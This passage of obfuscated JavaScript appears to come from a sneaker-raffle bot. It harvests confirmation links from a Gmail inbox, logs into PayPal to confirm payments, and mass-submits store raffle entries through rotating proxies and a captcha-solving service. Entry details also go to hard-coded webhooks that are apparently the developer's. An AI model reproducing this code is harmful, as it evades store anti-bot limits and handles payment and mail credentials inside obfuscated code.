    let _0xc856fc = await _0x4492c4();
    var _0x604441 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x277c68 = await _0x4f0735['get']('Amount'), _0xadf4ec = _0x277c68['Amount'];
    async function _0x3a31e4() {
        let _0x48620a = 0x0;
        var _0x54475d = new _0x550e5b({
            'user': _0x395552['masterMail'],
            'password': _0x395552['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x19a16b(_0x54e47c) {
            _0x54475d['openBox']('INBOX', ![], _0x54e47c);
        }
        _0x54475d['once']('ready', function () {
            _0x19a16b(function (_0x5728db, _0x358f33) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x5728db)
                    throw _0x5728db;
                _0x54475d['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x4ac86c, _0x3cc4c0) {
                    if (!_0x3cc4c0 || !_0x3cc4c0['length'])
                        console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20No\x20mails\x20found'), _0x54475d['end']();
                    else {
                        _0x3cc4c0 = _0x3cc4c0['slice'](0x0, _0xadf4ec);
                        var _0x4fd41c = _0x54475d['seq']['fetch'](_0x3cc4c0, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0x4fd41c['on']('message', function (_0x40732b, _0x2c98d3) {
                            var _0x19c7ff = '(#' + _0x2c98d3 + ')\x20';
                            _0x40732b['on']('body', function (_0x60458b, _0x8cbcb7) {
                                _0x169414(_0x60458b, (_0x3e20e2, _0x42be48) => {
                                    if (_0x42be48['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x42be48['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x42be48['text']['split']('[')[0x2];
                                        var _0x414b7f = mes['split'](']')[0x0];
                                        _0x604441['push'](_0x414b7f);
                                    }
                                });
                            }), _0x40732b['once']('end', function () {
                                _0x48620a++;
                            });
                        }), _0x4fd41c['once']('error', function (_0x33b295) {
                            console['log']('Fetch\x20error:\x20' + _0x33b295);
                        }), _0x4fd41c['once']('end', function () {
                            _0x54475d['end']();
                        });
                    }
                });
            });
        }), _0x54475d['once']('error', function (_0x453331) {
            console['log'](_0x1446ca['red'](_0x453331['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x54475d['once']('end', async function () {
        }), _0x54475d['connect']();
    }
    try {
        _0x3a31e4(), await _0x17175c(0xfa0), console['log']('Found\x20' + _0x604441['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x17175c(0xfa0);
    }
    var _0x172924;
    _0xe0def5('' + _0x4d1f2e);
    var _0x4982aa = _0xc856fc['Proxy']['split'](':'), _0x8ea24a;
    try {
        _0x8ea24a = await _0x3430c5['launch']({
            'userDataDir': 'sessions/' + _0xc856fc['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4982aa[0x0] + ':' + _0x4982aa[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x8ea24a = await _0x3430c5['launch']({
            'userDataDir': 'sessions/' + _0xc856fc['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x4982aa[0x0] + ':' + _0x4982aa[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Getting\x20Session');
        const _0x49c037 = await _0x8ea24a['newPage']();
        await _0x49c037['authenticate']({
            'username': '' + _0x4982aa[0x2],
            'password': '' + _0x4982aa[0x3]
        }), await _0x49c037['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x49c037['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x49c037['waitForSelector']('#email');
            let _0x2cdcc0 = await _0x49c037['$eval']('#email', _0x496fdd => _0x496fdd['getAttribute']('value'));
            if (_0x2cdcc0 == '') {
                await _0x49c037['type']('#email', _0xc856fc['Email']), await _0x17175c(0x1d3);
                let _0x15569d = await _0x49c037['$']('#splitPassword');
                _0x15569d && (await _0x49c037['click']('#btnNext'), await _0x17175c(0xa28)), await _0x49c037['type']('#password', _0xc856fc['Password']), await _0x17175c(0x35c), await _0x49c037['click']('#btnLogin');
            } else
                await _0x49c037['type']('#password', _0xc856fc['Password']), await _0x17175c(0x35c), await _0x49c037['click']('#btnLogin');
            await _0x49c037['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Successfully\x20logged\x20in'), await _0x17175c(0x2710);
        } catch (_0xfdeb04) {
            throw new Error('Login\x20session\x20expired\x20' + _0xfdeb04);
        }
        for (var _0xf3def5 = 0x0; _0xf3def5 < _0x604441['length']; _0xf3def5++) {
            console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20:\x20Starting\x20Verification'), _0xe0def5(_0x4d1f2e + '\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20/\x20' + _0x604441['length']);
            const _0x633116 = await _0x8ea24a['newPage']();
            await _0x633116['goto']('' + _0x604441[_0xf3def5], { 'waitUntil': 'networkidle2' }), await _0x17175c(0xbb8);
            try {
                const _0x1cc434 = await _0x633116['$']('#challenge-heading');
                _0x1cc434 && (console['log'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20:\x20' + _0x1446ca['yellow']('2FA\x20Required')), await _0x633116['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x17175c(0x9c40), await _0x633116['waitForSelector']('#payment-submit-btn'), await _0x633116['$eval']('#payment-submit-btn', _0x3ae2b5 => _0x3ae2b5['click']()), await _0x633116['click']('#payment-submit-btn');
                try {
                    await _0x633116['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x17175c(0x5dc), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0xebfe0) {
                    _0x2fb50e = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0xebfe0['message']);
                } finally {
                    if (_0x2fb50e == 'yes' && _0x293152 != 0x2) {
                        console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4d1f2e['name'] + ']\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x293152 + '\x20/\x205)')), _0xf3def5 = _0xf3def5 - 0x1, _0x293152 = _0x293152 + 0x1;
                        continue;
                    }
                    _0x2fb50e == 'yes' && _0x293152 >= 0x2 && (_0x2848bf(csv[_0xf3def5], _0x4d1f2e), _0x2fb50e = 'no', _0x293152 = 0x0), await _0x633116['close'](), await _0x17175c(0x4650);
                }
            } catch (_0x55d336) {
                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x4d1f2e + ']\x20Task\x20' + (_0xf3def5 + 0x1) + '\x20:\x20' + _0x55d336));
            }
        }
    } catch (_0x702687) {
        console['log'](_0x1446ca['red']('' + _0x702687));
    } finally {
        await _0x8ea24a['close']();
    }
}
const _0x469829 = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x3505d7, _0x3a0f05, _0x361390) {
                    _0x3430c5['use'](_0x5c6730()), _0x3430c5['use'](_0x4fb3d8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x395552['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x38e425 = 0x0; _0x38e425 < _0x3a0f05['length']; _0x38e425++) {
                        if (_0x3ebe5a != 'yes')
                            var _0x3ebe5a = '', _0x28f613 = 0x0;
                        var _0x2df37e;
                        try {
                            await _0x195de7(_0x3a0f05, _0x38e425);
                        } catch {
                            _0x3ebe5a = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0xe0def5(_0x3505d7['name'] + '\x20Task\x20' + (_0x38e425 + 0x1) + '\x20/\x20' + _0x3a0f05['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                        var _0x47f98c = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x302021 = Math['round'](Math['random']() * (_0x47f98c['length'] - 0x1));
                        _0x3a0f05[_0x38e425]['Size'] == 'RANDOM' && (_0x3a0f05[_0x38e425]['Size'] = _0x47f98c[_0x302021]);
                        var _0x3d0ce5 = Math['round'](Math['random']() * (_0x361390['length'] - 0x1)), _0x4ea78b = _0x361390[_0x3d0ce5]['split'](':'), _0x1fa2d9;
                        try {
                            _0x1fa2d9 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4ea78b[0x0] + ':' + _0x4ea78b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1fa2d9 = await _0x3430c5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4ea78b[0x0] + ':' + _0x4ea78b[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x247500 = await _0x1fa2d9['newPage']();
                            await _0x247500['authenticate']({
                                'username': '' + _0x4ea78b[0x2],
                                'password': '' + _0x4ea78b[0x3]
                            }), await _0x247500['setRequestInterception'](!![]), _0x247500['on']('request', _0x218d78 => {
                                _0x218d78['resourceType']() === 'image' || _0x218d78['resourceType']() === 'font' || _0x218d78['resourceType']() === 'media' ? _0x218d78['abort']() : _0x218d78['continue']();
                            }), await _0x247500['goto'](_0x3a0f05[_0x38e425]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x247500['waitForSelector']('#accept-all-gdpr'), await _0x247500['click']('#accept-all-gdpr'), await _0x247500['waitForSelector']('#raffles-product'), await _0x17175c(0x3e8), await _0x247500['$eval']('#raffles-product', _0x472fe0 => _0x472fe0['click']()), await _0x17175c(0x1388), await _0x247500['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x2b6666 = await _0x247500['$']('.fancybox-inner\x20>\x20iframe'), _0x3db1fd = await _0x2b6666['contentFrame']();
                            console['log'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x3db1fd['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x17175c(0x1f4), await _0x3db1fd['type']('input[name=\x22sm-form-email\x22]', _0x3a0f05[_0x38e425]['Email']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-name\x22]', _0x3a0f05[_0x38e425]['FirstName'] + '\x20' + _0x3a0f05[_0x38e425]['LastName']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-street\x22]', _0x3a0f05[_0x38e425]['Address1'] + '\x20' + _0x3a0f05[_0x38e425]['HouseNumber'] + '\x20' + _0x3a0f05[_0x38e425]['Address2']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-city\x22]', _0x3a0f05[_0x38e425]['City']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-province\x22]', _0x3a0f05[_0x38e425]['State']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-zip\x22]', _0x3a0f05[_0x38e425]['Zip']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-country\x22]', _0x3a0f05[_0x38e425]['Country']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-form-phone\x22]', _0x3a0f05[_0x38e425]['Phone']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x3a0f05[_0x38e425]['Follower']), await _0x17175c(0xc8), await _0x3db1fd['type']('input[name=\x22sm-cst.size\x22]', _0x3a0f05[_0x38e425]['Size']), await _0x17175c(0x1f4), await _0x3db1fd['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x17175c(0x1f4), await _0x3db1fd['click']('.icheckbox_simple-custom'), await _0x17175c(0x1f4), console['log'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x3db1fd['$eval']('form', _0x123436 => _0x123436['submit']()), console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x3ebe5a = '';
                            var _0x106cc8 = await _0x262703(_0x3a0f05[_0x38e425], _0x3505d7, 'dev', ![]), _0x2e8f7d = await _0x262703(_0x3a0f05[_0x38e425], _0x3505d7, 'pub', ![]);
                            const _0x516ea2 = {
                                'succesDEVMSG': { 'embeds': [_0x106cc8] },
                                'succesPUBMSG': { 'embeds': [_0x2e8f7d] }
                            };
                            try {
                                _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x516ea2['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x516ea2['succesDEVMSG']), await _0x17175c(0xc8), await _0x17b782(_0xd9f2b8, _0x516ea2['succesPUBMSG']);
                            } catch (_0x29fd06) {
                                console['log'](_0x1446ca['yellow'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x29fd06));
                            }
                        } catch (_0x15cf05) {
                            console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20' + _0x15cf05)), _0x2df37e = '' + _0x15cf05;
                            var _0x24e7ad = await _0x262703(_0x3a0f05[_0x38e425], _0x3505d7, 'dev', !![], _0x2df37e), _0x106cc8 = await _0x262703(_0x3a0f05[_0x38e425], _0x3505d7, 'dev', ![]), _0x2e8f7d = await _0x262703(_0x3a0f05[_0x38e425], _0x3505d7, 'pub', ![]);
                            const _0x2e3ab7 = {
                                'succesDEVMSG': { 'embeds': [_0x106cc8] },
                                'succesPUBMSG': { 'embeds': [_0x2e8f7d] }
                            };
                            _0x2e3ab7['errorDEV'] = { 'embeds': [_0x24e7ad] }, _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x2e3ab7['errorDEV']), await _0x17b782(_0x40c5c7, _0x2e3ab7['errorDEV']), _0x15cf05 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x3ebe5a = 'yes');
                        } finally {
                            _0x1fa2d9['close']();
                            if (_0x3ebe5a == 'yes' && _0x28f613 != 0x5 && _0x2df37e != 'Size\x20Not\x20Found') {
                                console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Task\x20' + (_0x38e425 + 0x1) + '\x20:\x20Retrying\x20(' + _0x28f613 + '\x20/\x205)\x20')), _0x38e425 = _0x38e425 - 0x1, _0x28f613 = _0x28f613 + 0x1;
                                continue;
                            }
                            _0x3ebe5a == 'yes' && _0x28f613 >= 0x5 && (_0x2848bf(_0x3a0f05[_0x38e425], _0x3505d7), _0x3ebe5a = 'no', _0x28f613 = 0x0), console['log'](_0x34a417() + '\x20[' + _0x3505d7['name'] + ']\x20Waiting\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2c17d6, _0x53ea2b) {
                    var _0x370e58 = [];
                    async function _0x1cd872() {
                        var _0x7d2552 = new _0x550e5b({
                            'user': _0x395552['masterMail'],
                            'password': _0x395552['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4e70c5(_0x4920ee) {
                            _0x7d2552['openBox']('INBOX', ![], _0x4920ee);
                        }
                        _0x7d2552['once']('ready', function () {
                            _0x4e70c5(function (_0x1c66aa, _0x271564) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1c66aa)
                                    throw _0x1c66aa;
                                _0x7d2552['seq']['search'](['UNSEEN'], function (_0x5c79ed, _0x47c9b2) {
                                    if (!_0x47c9b2 || !_0x47c9b2['length'])
                                        console['log'](_0x34a417() + '\x20[' + _0x2c17d6['name'] + ']\x20No\x20mails\x20found'), _0x7d2552['end']();
                                    else {
                                        var _0x442247 = _0x7d2552['seq']['fetch'](_0x47c9b2, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x442247['on']('message', function (_0x2d9955, _0xa767b) {
                                            var _0x8a1a98 = '(#' + _0xa767b + ')\x20';
                                            _0x2d9955['on']('body', function (_0x2f2b92, _0x177d58) {
                                                _0x169414(_0x2f2b92, (_0x162fd1, _0x1b62ed) => {
                                                    if (_0x1b62ed['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x5469d3 = _0x1b62ed['html']['split']('\x0a');
                                                        for (var _0x2e02a5 = 0x0; _0x2e02a5 < _0x5469d3['length']; _0x2e02a5++) {
                                                            if (_0x5469d3[_0x2e02a5]['includes']('salesmanago') && _0x5469d3[_0x2e02a5]['includes']('<td') && _0x5469d3[_0x2e02a5]['includes']('href')) {
                                                                var _0x4e267c = _0x5469d3[_0x2e02a5]['split']('href=\x22'), _0x49ae32 = _0x4e267c[0x1]['split']('\x22')[0x0];
                                                                _0x370e58['push'](_0x49ae32);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x2d9955['once']('end', function () {
                                            });
                                        }), _0x442247['once']('error', function (_0x190dc0) {
                                            console['log']('Fetch\x20error:\x20' + _0x190dc0);
                                        }), _0x442247['once']('end', function () {
                                            _0x7d2552['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x7d2552['once']('error', function (_0x3d3e26) {
                            console['log'](_0x1446ca['red'](_0x3d3e26['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x7d2552['once']('end', async function () {
                        }), _0x7d2552['connect']();
                    }
                    async function _0x2f9c2b(_0x2f0813, _0x5617c0, _0x443c3e) {
                        for (var _0x3ec91a = 0x0; _0x3ec91a < _0x5617c0['length']; _0x3ec91a++) {
                            async function _0x26a025(_0x44de81, _0x5e4d7d, _0x505c6f, _0x4c08c4, _0x24cdcb) {
                                var _0x3ade17, _0x5b2182 = {}, _0x4caf42 = [], _0x4d3972 = {}, _0x104a03 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1e38b0 = Math['round'](Math['random']() * (_0x104a03['length'] - 0x1));
                                _0x4c08c4[_0x44de81]['Size'] == 'RANDOM' && (_0x4c08c4[_0x44de81]['Size'] = _0x104a03[_0x1e38b0]);
                                !_0x4c08c4 && (_0x4c08c4 = {});
                                if (_0x395552['useRandomProxy'] = ![])
                                    var _0x456bf8 = _0x24cdcb[_0x44de81]['split'](':');
                                else
                                    var _0x214812 = Math['round'](Math['random']() * (_0x24cdcb['length'] - 0x1)), _0x456bf8 = _0x24cdcb[_0x214812]['split'](':');
                                var _0x929f3a = {
                                    'jar': _0x406b27,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x505c6f['url'],
                                    'headers': _0x505c6f['headers'],
                                    'body': JSON['stringify'](_0x5b2182),
                                    'proxy': 'http://' + _0x456bf8[0x2] + ':' + _0x456bf8[0x3] + '@' + _0x456bf8[0x0] + ':' + _0x456bf8[0x1]
                                };
                                return _0x5e4d7d != 'ver' && (_0x929f3a['url'] = _0x505c6f['url'], _0x929f3a['headers'] = _0x505c6f['headers']), _0x5e4d7d == 'ver' && (_0x929f3a['method'] = 'GET', _0x929f3a['url'] = _0x4c08c4[_0x44de81]), new Promise(function (_0x40139a, _0x30cf23) {
                                    callback = async (_0x19a346, _0x14d6ba, _0x4c5352) => {
                                        if (!_0x19a346 && _0x14d6ba['statusCode'] == 0xca || !_0x19a346 && _0x14d6ba['statusCode'] == 0xc8) {
                                            if (_0x5e4d7d != 'ver') {
                                                var _0x5a46f3 = await _0x262703(_0x4c08c4[_0x44de81], _0x505c6f, 'dev', ![]), _0x35e369 = await _0x262703(_0x4c08c4[_0x44de81], _0x505c6f, 'pub', ![]);
                                                const _0x4d1e22 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5a46f3] },
                                                    'succesPUBMSG': { 'embeds': [_0x35e369] }
                                                };
                                                if (_0x395552['webhook'] != undefined && _0x395552['webhook'] != '')
                                                    try {
                                                        await _0x17b782(_0x395552['webhook'], _0x4d1e22['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x17175c(0xc8), await _0x17b782(_0x2b6dac, _0x4d1e22['succesDEVMSG']), await _0x17175c(0xc8);
                                                try {
                                                    await _0x17b782(_0xd9f2b8, _0x4d1e22['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x12263c(_0x4c08c4[_0x44de81], _0x505c6f);
                                            }
                                            _0x40139a(console['log'](_0x1446ca['green'](_0x34a417() + '\x20[' + _0x505c6f['name'] + ']\x20Task\x20' + (_0x44de81 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5e4d7d != 'ver') {
                                                var _0x5e048f = '' + _0x19a346, _0x27693a = await _0x262703(_0x4c08c4[_0x44de81], _0x505c6f, 'dev', !![], _0x5e048f), _0x502f55 = {};
                                                _0x502f55['errorDEV'] = { 'embeds': [_0x27693a] }, _0x2848bf(_0x4c08c4[_0x44de81], _0x505c6f), _0x395552['webhook'] != undefined && _0x395552['webhook'] != '' && await _0x17b782(_0x395552['webhook'], _0x502f55['errorDEV']), await _0x17b782(_0x40c5c7, _0x502f55['errorDEV']);
                                            }
                                            _0x30cf23(console['log'](_0x1446ca['red'](_0x34a417() + '\x20[' + _0x505c6f['name'] + ']\x20Task\x20' + (_0x44de81 + 0x1) + ':\x20' + _0x19a346)));
                                        }
                                    };
                                    try {
                                        _0x5e4d7d != 'ver' ? console['log'](_0x34a417() + '\x20[' + _0x505c6f['name'] + ']\x20Task\x20' + (_0x44de81 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5b2182['data']['attributes']['email']) : console['log'](_0x34a417() + '\x20[' + _0x505c6f['name'] + ']\x20Task\x20' + (_0x44de81 + 0x1) + ':\x20Fetching\x20Response'), _0x1c9afe(_0x929f3a, callback);
                                    } catch (_0x27d273) {
                                        console['log'](_0x34a417() + '\x20Task\x20' + (_0x44de81 + 0x1) + ':\x20' + _0x27d273);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x26a025(_0x3ec91a, 'ver', _0x2f0813, _0x5617c0, _0x443c3e), console['log'](_0x34a417() + '\x20[' + _0x2f0813['name'] + ']\x20Sleeping\x20for\x20' + _0x395552['delay'] + '\x20ms'), await _0x17175c(_0x395552['delay']);
                            } catch (_0x3e9369) {
                            }
                        }
                    }
                    try {
                        _0x1cd872(), await _0x17175c(0xfa0), console['log']('Found\x20' + _0x370e58['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x2f9c2b(_0x2c17d6, _0x370e58, _0x53ea2b);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x43f4e3, _0x26cf44, _0x37585a) {
                for (var _0x1772cc = 0x0; _0x1772cc < _0x26cf44['length']; _0x1772cc++) {
                    _0x395552['AfewDelay'] = _0x395552['delay'];
                    var _0x2f6aad;
                    if (_0x56eb82 != 'yes')
                        var _0x56eb82 = '', _0x1ec741 = 0x0;
                    var _0x33d3ad = _0x26cf44[_0x1772cc]['Url'], _0xe59f3a = _0x26cf44[_0x1772cc];
                    _0xe0def5(_0x43f4e3['name'] + '\x20Task\x20' + (_0x1772cc + 0x1) + '\x20/\x20' + _0x26cf44['length'] + '\x20||\x20File:\x20' + _0x1946fb + '\x20Proxies:\x20' + _0x487348);
                    try {
                        await _0x195de7(_0x26cf44, _0x1772cc);
                    } catch {
                        _0x56eb82 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x485ca1(_0x88286e) {
                        const _0x3d76d2 = _0x2e1301['readFileSync']('../successful-tasks.csv', 'utf8'), _0x396326 = _0x221bee['parse'](_0x3d76d2, { 'header': !![] })['data'];
                        let _0xeec7f = ![];
                        for (var _0x1aa81a of _0x396326) {
                            if (_0x1aa81a['Url'] == _0x88286e['Url'] && _0x1aa81a['Email'] == _0x88286e['Email']) {
                                _0xeec7f = !![];
                                break;
                            }
                        }
                        return _0xeec7f;
                    }
                    if (await _0x485ca1(_0x26cf44[_0x1772cc]) == !![]) {
                        console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xb79d3e = await _0x262703(_0x26cf44[_0x1772cc], _0x43f4e3, 'dev', ![]), _0xb0baae = await _0x262703(_0x26cf44[_0x1772cc], _0x43f4e3, 'pub', ![]);
                    const _0x30f0b5 = {
                        'succesDEVMSG': { 'embeds': [_0xb79d3e] },
                        'succesPUBMSG': { 'embeds': [_0xb0baae] }
                    };
                    if (_0x26cf44[_0x1772cc]['Email'] == '' || _0x26cf44[_0x1772cc]['FirstName'] == '' || _0x26cf44[_0x1772cc]['LastName'] == '' || _0x26cf44[_0x1772cc]['Country'] == '' || _0x26cf44[_0x1772cc]['Size'] == '' || _0x26cf44[_0x1772cc]['Address1'] == '' || _0x26cf44[_0x1772cc]['Zip'] == '') {
                        console['log'](_0x34a417() + '\x20[' + _0x43f4e3['name'] + ']\x20Task\x20' + (_0x1772cc + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x395552['useRandomProxy'] = ![])
                        var _0x4413f6 = _0x37585a[_0x1772cc]['split'](':');
                    else
                        var _0x22781d = Math['round'](Math['random']() * (_0x37585a['length'] - 0x1)), _0x4413f6 = _0x37585a[_0x22781d]['split'](':');
                    var _0x4e2c9c;
                    try {
                        _0x4e2c9c = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4413f6[0x0] + ':' + _0x4413f6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x4e2c9c = await _0x3430c5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4413f6[0x0] + ':' + _0x4413f6[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        var _0x194ca6 = JSON['parse'](_0x2e1301['readFileSync']('sizes.json', 'utf-8')), _0x33d3ad = _0x26cf44[_0x1772cc]['Url'], _0x123032 = _0x26cf44[_0x1772cc]['Size'], _0x313f5c;
                        async function _0x486992() {
                            var _0x134415 = new _0x1af6fa['CookieJar']();
